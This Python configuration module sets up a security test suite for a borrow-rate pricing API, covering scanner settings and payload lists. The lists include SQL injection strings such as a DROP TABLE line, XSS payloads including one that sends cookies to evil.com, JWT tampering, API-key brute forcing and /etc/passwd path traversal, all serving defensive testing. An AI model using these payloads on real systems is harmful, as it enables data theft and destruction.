"""
Configuration settings for security tests of the Borrow Rate & Locate Fee Pricing Engine.

This module provides environment-specific configuration, security tool settings,
test payloads configuration, and utility functions for accessing these settings
throughout the security test suite.
"""

import os
import enum
import json
from pathlib import Path
from typing import Dict, List, Optional, Union, Any
from dotenv import load_dotenv  # version: 0.19.0

# Singleton instance
_instance = None

# Default configuration values
DEFAULT_API_VERSION = "v1"
DEFAULT_SECURITY_SCAN_TIMEOUT = 300  # 5 minutes
DEFAULT_RATE_LIMIT_THRESHOLD = 60  # requests per minute


class TestEnvironment(enum.Enum):
    """Enumeration of test environments for security testing."""
    LOCAL = "local"
    DEVELOPMENT = "development"
    STAGING = "staging"
    PRODUCTION = "production"

    @staticmethod
    def get_env() -> 'TestEnvironment':
        """
        Gets the current test environment from environment variables or defaults to LOCAL.
        
        Returns:
            TestEnvironment: Current test environment
        """
        env_name = os.environ.get("TEST_ENV", "local").upper()
        try:
            return TestEnvironment[env_name]
        except KeyError:
            # Default to LOCAL if environment not found
            return TestEnvironment.LOCAL


class SecurityToolsConfig:
    """Configuration for security testing tools."""
    
    def __init__(self, config_dict: Optional[Dict[str, Any]] = None):
        """
        Initializes the SecurityToolsConfig with default values.
        
        Args:
            config_dict: Optional dictionary with configuration values to override defaults
        """
        # Default ZAP configuration
        self.zap = {
            "api_url": "http://localhost:8080",
            "api_key": "",
            "context_name": "borrow_rate_engine",
            "include_urls": ["^https?://.*api/v[0-9]+/.*$"],
            "exclude_urls": ["^https?://.*\\.js$", "^https?://.*\\.css$", "^https?://.*\\.png$"],
            "attack_mode": "STANDARD",
            "scan_policy": "Default Policy",
            "ajax_spider": True,
            "passive_scan_wait_time": 1000,
            "max_children": 0
        }
        
        # Default JWT analyzer configuration
        self.jwt_analyzer = {
            "check_signature": True,
            "check_expiry": True,
            "check_weak_keys": True,
            "check_claims": ["sub", "iss", "exp"],
            "allowed_algorithms": ["HS256", "HS384", "HS512", "RS256"],
            "disallowed_algorithms": ["none", "HS1"]
        }
        
        # Default fuzzer configuration
        self.fuzzer = {
            "payloads_path": str(Path(__file__).parent / "payloads"),
            "iterations": 100,
            "max_payload_length": 8192,
            "timeout_per_request": 5,
            "follow_redirects": True,
            "concurrent_requests": 10,
            "parameter_targets": ["query", "body", "header"]
        }
        
        # Default dependency scanner configuration
        self.dependency_scanner = {
            "scan_dependencies": True,
            "fail_on_critical": True,
            "check_outdated": True,
            "cvss_threshold": 7.0,
            "ignore_dev_dependencies": True,
            "package_files": ["requirements.txt", "Pipfile", "pyproject.toml"]
        }
        
        # Override defaults with provided configuration
        if config_dict:
            for key, value in config_dict.items():
                if hasattr(self, key) and isinstance(getattr(self, key), dict):
                    getattr(self, key).update(value)


class TestPayloadsConfig:
    """Configuration for security test payloads."""
    
    def __init__(self, config_dict: Optional[Dict[str, Any]] = None):
        """
        Initializes the TestPayloadsConfig with default values.
        
        Args:
            config_dict: Optional dictionary with configuration values to override defaults
        """
        # SQL injection payloads
        self.sql_injection = {
            "basic": ["' OR 1=1 --", "\" OR 1=1 --", "1' OR '1'='1", "admin'--"],
            "advanced": [
                "UNION ALL SELECT 1,2,3,4,5--",
                "'; DROP TABLE stocks; --",
                "1'; SELECT @@version; --",
                "' OR EXISTS(SELECT * FROM stocks WHERE ticker LIKE '%a%') --"
            ],
            "error_based": [
                "' AND 1=(SELECT COUNT(*) FROM tabname WHERE 1=1) --",
                "' AND 1/0 --",
                "' AND 1=CONVERT(int,(SELECT @@version)) --"
            ]
        }
        
        # XSS payloads
        self.xss = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            "advanced": [
                "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
                "<svg/onload=alert('XSS')>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "\"><script>fetch('https://evil.com?cookie='+document.cookie)</script>"
            ]
        }
        
        # Authentication bypass payloads
        self.authentication_bypass = {
            "api_keys": ["", "null", "undefined", "invalid_key", "expired_key"],
            "jwt_tampering": [
                {"claim": "exp", "value": 9999999999},
                {"claim": "role", "value": "admin"},
                {"claim": "alg", "value": "none"}
            ],
            "brute_force": {
                "common_api_keys": ["test", "demo", "admin", "password", "123456"],
                "max_attempts": 50,
                "delay_between_attempts": 0.5
            }
        }
        
        # Input validation payloads
        self.input_validation = {
            "ticker_symbols": [
                "",
                "A" * 256,  # Max length overflow
                "AAPL;",
                "../../../etc/passwd",
                "AAPL\u0000",  # Null byte injection
                "%00",  # URL encoded null byte
                "<script>alert(1)</script>"
            ],
            "position_value": [
                -1,
                0,
                1,
                1e10,
                "0",
                "not_a_number",
                "' OR 1=1 --",
                9007199254740992  # JavaScript MAX_SAFE_INTEGER + 1
            ],
            "loan_days": [
                -1,
                0,
                1,
                365,
                9999,
                "0",
                "not_a_number",
                "' OR 1=1 --"
            ],
            "client_id": [
                "",
                "A" * 256,
                "../../../etc/passwd",
                "<script>alert(1)</script>",
                "' OR 1=1 --",
                "admin' OR '1'='1"
            ]
        }
        
        # Override defaults with provided configuration
        if config_dict:
            for key, value in config_dict.items():
                if hasattr(self, key):
                    current_value = getattr(self, key)
                    if isinstance(current_value, dict) and isinstance(value, dict):
                        # Deep merge for nested dictionaries
                        self._deep_merge(current_value, value)
                    else:
                        setattr(self, key, value)
    
    def _deep_merge(self, target: Dict, source: Dict) -> None:
        """
        Deep merge two dictionaries, updating nested dictionaries as well.
        
        Args:
            target: Target dictionary to merge into
            source: Source dictionary to merge from
        """
        for key, value in source.items():
            if key in target and isinstance(target[key], dict) and isinstance(value, dict):
                self._deep_merge(target[key], value)
            else:
                target[key] = value


class TestSettings:
    """Main configuration class for security tests."""
    
    def __init__(self):
        """Initializes the TestSettings with values from environment variables."""
        # Determine environment and load variables
        self.environment = TestEnvironment.get_env()
        load_test_env(self.environment.value)
        
        # API configuration
        self.api_base_url = os.environ.get("API_BASE_URL", "http://localhost:8000")
        self.api_version = os.environ.get("API_VERSION", DEFAULT_API_VERSION)
        self.test_api_key = os.environ.get("TEST_API_KEY", "test_api_key")
        self.invalid_api_key = "invalid_api_key_for_testing"
        
        # Security scan configuration
        self.security_scan_timeout = int(os.environ.get("SECURITY_SCAN_TIMEOUT", 
                                                       DEFAULT_SECURITY_SCAN_TIMEOUT))
        self.use_tls_verification = os.environ.get("USE_TLS_VERIFICATION", "True").lower() == "true"
        self.zap_api_url = os.environ.get("ZAP_API_URL", "http://localhost:8080")
        self.rate_limit_threshold = int(os.environ.get("RATE_LIMIT_THRESHOLD", 
                                                      DEFAULT_RATE_LIMIT_THRESHOLD))
        
        # Load tool and payload configurations
        self.security_tools_config = self.load_security_tools_config()
        self.test_payloads_config = self.load_test_payloads_config()
    
    def get_api_url(self, endpoint: Optional[str] = None) -> str:
        """
        Constructs the full API URL with version.
        
        Args:
            endpoint: Optional API endpoint path
            
        Returns:
            str: Full API URL
        """
        base = f"{self.api_base_url}/api/{self.api_version}"
        if endpoint:
            # Ensure endpoint starts with a slash if it doesn't already
            if not endpoint.startswith('/'):
                endpoint = f"/{endpoint}"
            return f"{base}{endpoint}"
        return base
    
    def get_security_tool_config(self, tool_name: str) -> Dict:
        """
        Gets configuration for a specific security tool.
        
        Args:
            tool_name: Name of the security tool
            
        Returns:
            dict: Tool configuration
            
        Raises:
            ValueError: If tool_name is not found
        """
        if hasattr(self.security_tools_config, tool_name):
            return getattr(self.security_tools_config, tool_name)
        raise ValueError(f"Security tool configuration not found: {tool_name}")
    
    def get_test_payload(self, payload_type: str, payload_name: str) -> Union[str, Dict, List]:
        """
        Gets a specific test payload by type and name.
        
        Args:
            payload_type: Type of payload (e.g., "sql_injection", "xss")
            payload_name: Name of the specific payload within the type
            
        Returns:
            The requested payload
            
        Raises:
            ValueError: If payload_type or payload_name is not found
        """
        if hasattr(self.test_payloads_config, payload_type):
            payload_collection = getattr(self.test_payloads_config, payload_type)
            if payload_name in payload_collection:
                return payload_collection[payload_name]
            raise ValueError(f"Payload name not found: {payload_name}")
        raise ValueError(f"Payload type not found: {payload_type}")
    
    def load_security_tools_config(self) -> SecurityToolsConfig:
        """
        Loads security tools configuration from file or environment.
        
        Returns:
            SecurityToolsConfig: Security tools configuration
        """
        config_dict = None
        
        # Try to load from environment variable
        env_config = os.environ.get("SECURITY_TOOLS_CONFIG")
        if env_config:
            try:
                config_dict = json.loads(env_config)
            except json.JSONDecodeError:
                pass
        
        # Try to load from file if not in environment
        if not config_dict:
            config_path = Path(__file__).parent / "security_tools_config.json"
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        config_dict = json.load(f)
                except (json.JSONDecodeError, IOError):
                    pass
        
        return SecurityToolsConfig(config_dict)
    
    def load_test_payloads_config(self) -> TestPayloadsConfig:
        """
        Loads test payloads configuration from file or environment.
        
        Returns:
            TestPayloadsConfig: Test payloads configuration
        """
        config_dict = None
        
        # Try to load from environment variable
        env_config = os.environ.get("TEST_PAYLOADS_CONFIG")
        if env_config:
            try:
                config_dict = json.loads(env_config)
            except json.JSONDecodeError:
                pass
        
        # Try to load from file if not in environment
        if not config_dict:
            config_path = Path(__file__).parent / "test_payloads_config.json"
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        config_dict = json.load(f)
                except (json.JSONDecodeError, IOError):
                    pass
        
        return TestPayloadsConfig(config_dict)


def load_test_env(env_name: str) -> bool:
    """
    Loads environment variables from the appropriate .env file based on the test environment.
    
    Args:
        env_name: Name of the test environment
        
    Returns:
        bool: True if environment variables were loaded successfully
    """
    # Determine the path to the environment file
    env_file = Path(__file__).parent / f".env.{env_name}"
    
    # If environment-specific file doesn't exist, try default .env
    if not env_file.exists():
        env_file = Path(__file__).parent / ".env"
    
    # Return True if the file exists and was loaded, False otherwise
    return load_dotenv(env_file) if env_file.exists() else False


def get_test_settings() -> TestSettings:
    """
    Returns a singleton instance of TestSettings.
    
    Returns:
        TestSettings: Singleton instance of TestSettings
    """
    global _instance
    if _instance is None:
        _instance = TestSettings()
    return _instance